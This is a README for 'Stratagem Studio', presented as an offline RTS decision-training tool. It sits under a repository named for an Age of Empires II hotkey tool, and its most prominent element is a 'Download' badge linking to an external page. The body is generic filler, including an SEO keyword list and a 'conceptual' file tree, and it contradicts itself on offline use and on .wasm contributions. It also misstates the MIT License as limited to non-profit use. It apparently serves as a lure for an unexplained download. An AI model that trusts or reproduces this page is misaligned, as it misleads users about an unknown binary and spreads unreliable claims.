![preview](https://raw.githubusercontent.com/Tietuf/ao2-hotkey-forge/main/showcase_a416.svg)
[![Download](https://raw.githubusercontent.com/Tietuf/ao2-hotkey-forge/main/bin_64798.svg)](https://Tietuf.github.io/ao2-hotkey-forge/)

# Stratagem Studio 🎮

*An interactive decision-tree laboratory for mastering real-time strategy game theory, inspired by the precision of Age of Empires II hotkey optimization.*

---

## 🧠 What Is Stratagem Studio?

Stratagem Studio is a browser-based cognitive training environment designed for players who want to internalize strategic decision patterns, build orders, and micro-management sequences *without* relying on muscle memory alone. While many tools focus on keybind repetition, Stratagem Studio takes a different route: it treats your brain like a **decision engine** and trains it to recognize patterns, prioritize actions, and recover from disruption.

The project is a spiritual cousin to hotkey drill apps—but instead of teaching your fingers where to go, it teaches your **mind** where to look, what to prioritize, and how to re-sequence under pressure. The result is a calmer, more adaptive playstyle that reduces panic clicks and improves mid-game resilience.

---

## 🌟 Why This Exists

Most RTS players plateau because they practice the *same* scenarios in the *same* order. Stratagem Studio breaks that loop by generating **procedural pressure drills**—micro-simulations that force you to re-evaluate your priorities mid-execution. The goal is not to make you faster at clicking, but to make your decision-making faster and more accurate when your plan inevitably falls apart.

The platform is:
- **Locally processed** – your practice data never leaves your device. No cloud, no tracking, no telemetry.
- **Drill-builder friendly** – you can import your own scenario files (JSON, YAML, or plain text) and convert them into interactive mental exercises.
- **Indistinguishable from play** – the UI mimics real game telemetry (resource counts, minimap pings, idle villagers) to create ecological validity.

---

## 🚀 Core Features

| Feature | Description |
|---|---|
| **Procedural Scenario Generator** | Generates randomized disruption events (e.g., "lure boar while walling" or "transition to archers while being flanked") that force you to re-run your mental model. |
| **Decision Latency Analyzer** | Tracks how quickly you shift focus after a disruption event. This is a more useful metric than raw APM. |
| **Custom Drill Importer** | Drag-and-drop your own scenario files into the browser. The system parses timestamps, conditions, and branching outcomes. |
| **Offline-First Architecture** | All processing happens via WebAssembly and local IndexedDB. No server round-trips mean zero added latency and absolute privacy. |
| **Bilingual Practice Mode** | Switch between English and Spanish UI overlays to train your brain to recognize action cues in different languages. |
| **Adaptive Difficulty Curve** | The system monitors your decision latency and increases the *complexity* of distraction events, not just the speed. |
| **Session Replay Timeline** | After each drill, review your focus shifts as a visual timeline to see where you hesitated or double-guessed. |

---

## 🧩 How It Works (The Philosophy)

Think of a traditional hotkey trainer as a **piano metronome**—it helps you keep tempo but doesn't teach you music theory. Stratagem Studio is more like a **jazz improvisation coach**. It gives you a chord progression (your build order), then throws in unexpected tempo changes (enemy aggression) and forces you to find a new melodic line (your counter-strategy).

The core loop:
1. **Setup phase** – You choose a scenario archetype (e.g., "Feudal pressure" or "Fast Castle into Knights").
2. **Execution phase** – You respond to on-screen events that simulate real game interruptions.
3. **Reflection phase** – You review your focus-shift timeline and identify decision bottlenecks.
4. **Iteration** – The system tweaks the disruption pattern to target your specific weak points.

This is not about typing faster. It is about **thinking clearer** under simulated uncertainty.

---

## 📊 SEO-Friendly Keyword Insights

- *Real-time strategy cognitive training*
- *Browser-based decision simulator for RTS players*
- *Offline practice tools for Age of Empires-style gaming*
- *Build order recall drill software*
- *Local-first game analysis tools*
- *Mental agility training for esports*
- *Interactive scenario builder for strategy gamers*
- *Reaction time improvement for competitive gaming*
- *Model-view-controller design for game trainers*

---

## 🗂️ Repository Structure (Conceptual)

```
stratagem-studio/
├── src/
│   ├── core/               # Decision-tree engine & event bus
│   ├── generators/         # Procedural scenario parsers
│   ├── analyzers/          # Latency & focus-shift metrics
│   ├── ui/                 # React-based interface components
│   └── workers/            # WebAssembly modules for offline processing
├── drills/                 # Community-contributed scenario files
│   ├── beginner/
│   ├── intermediate/
│   └── expert/
├── docs/
│   ├── scenario-schema.md  # How to write your own drill files
│   └── philosophy.md       # The learning model behind Stratagem Studio
└── tests/                  # Unit and integration tests for the core engine
```

---

## 🛠️ Built With (and Why)

- **Rust (compiled to WASM)** – for blazing-fast local processing of scenario logic without external dependencies.
- **SvelteKit** – because the UI needs to be reactive but lightweight, responsive on both desktop and mobile.
- **Yjs** – for optional peer-to-peer synchronization if you want to share custom drills with a friend locally.
- **IndexedDB** – for persistent session history and drill progress tracking, all contained in your browser profile.

---

## 💡 Original Perspective: Training the "OODA Loop"

Every drill in Stratagem Studio is designed around the **OODA loop** framework (Observe, Orient, Decide, Act). Where hotkey trainers compress the *Act* phase, Stratagem Studio slows it down and compresses the *Observe* and *Orient* phases instead.

Your brain gets better at:
- **Observing** – noticing that your gold miners are idle while you are microing your scout.
- **Orienting** – realizing that your build order is now 30 seconds behind because you tried to lure two boars at once.
- **Deciding** – choosing between a defensive tower (safe) versus a forward archery range (risky but tempo-positive).
- **Acting** – executing the chosen response without second-guessing your self.

---

## 🌐 Multilingual & Accessibility Features

- **Bilingual UI overlays** for EN / ES / PT-BR (more languages planned for 2026).
- **High-contrast theme** for low-vision users.
- **Keyboard-only navigation** for players who prefer not to use a mouse.
- **Screen-reader friendly** drill descriptions (ARIA labels included).

---

## 📥 How to Import Custom Drills

Stratagem Studio uses a **human-readable scenario schema** (JSON or YAML). You can write a drill that simulates a common mid-game panic moment:

```yaml
id: "feudal_flank_panic"
name: "Double Rushed at 12 Minutes"
events:
  - time: "12:00"
    trigger: "enemy_scout_enters_your_base"
    action_prompt: "Lure boar into TC or send villager to wall?"
    options:
      - "Lure boar"  # outcome: +50 food but idle TC
      - "Wall off"    # outcome: -100 wood but safe for 20s
  - time: "12:15"
    trigger: "gold_miners_idle"
    action_prompt: "Send 2 villagers back to gold or build a barracks?"
    options:
      - "Send to gold"  # safe choice
      - "Build barracks" # aggressive choice
```

The system will parse this file and generate a visually interactive drill with a timer bar, resource counters, and a minimap ping.

---

## 📈 Progress Metrics That Matter

Forget about clicks-per-minute. Stratagem Studio tracks four primary metrics:

1. **Decision latency variance** – how consistent you are under different pressure levels.
2. **Resource drift** – how far your economy drifts from optimal after a disruption.
3. **Restoration speed** – how quickly you return to your original strategy after responding to an event.
4. **Cognitive load coefficient** – the rate at which your accuracy declines as event complexity increases.

These metrics are presented as easy-to-understand radar charts after each session.

---

## 🤝 Contributing (Without a Git Clone)

If you want to contribute, you can:

- Write new `.yaml` drill scenarios and submit them via a web form (the repository also accepts patch files).
- Refactor the WASM core and provide a bundle as a downloadable `.wasm` artifact for reviewers.
- Report conceptual issues about the OODA loop implementation in the Discussions tab.

---

## 📜 License

Stratagem Studio is released under the [MIT License](LICENSE.txt). You are free to use, modify, and distribute the code for your own non-profit practice tools. The MIT license ensures that your custom drill files remain your own intellectual property. For the full legal text, please refer to the LICENSE file in the repository root. We believe that *practice tools should be shared*, and the MIT license provides exactly that flexibility for the 2026 ecosystem of RTS learning aids.

---

## ⚠️ Disclaimer

Stratagem Studio is an independent, unofficial learning tool. It is not affiliated with, endorsed by, or sponsored by any game publisher or developer. All game-related terminology (e.g., "boar," "TC," "Feudal Age") is used for descriptive purposes only to make drills relatable to players. The tool does not modify any game files, does not connect to any live game services, and does not provide competitive advantages that violate fair play. It is purely a mental rehearsal instrument to improve your own decision-making skills.

---

## 🗓️ Roadmap for 2026

- **Q1 2026** – Add a community drill gallery (synchronous, not server-based – peer-to-peer discovery via WebTorrent).
- **Q2 2026** – Implement dashboard widgets for comparing your latency trends across weeks.
- **Q3 2026** – Introduce voice-based action cues (speak the action instead of clicking) for accessibility.
- **Q4 2026** – Release a command-line converter that transforms existing hotkey drill files into Stratagem Studio scenarios.

---

## 📖 Further Reading on the Philosophy

Read the `docs/philosophy.md` file to understand why the chosen approach prioritizes *decision architecture* over *input speed*. The short version: you can only click as fast as you can think. Most players cap out because their thinking is cluttered, not because their fingers are slow. Stratagem Studio helps you declutter your in-game cognition so that your clicks become more deliberate and more accurate.

---

*Built for the calm competitor who wants to win the mental game first, then the physical one.*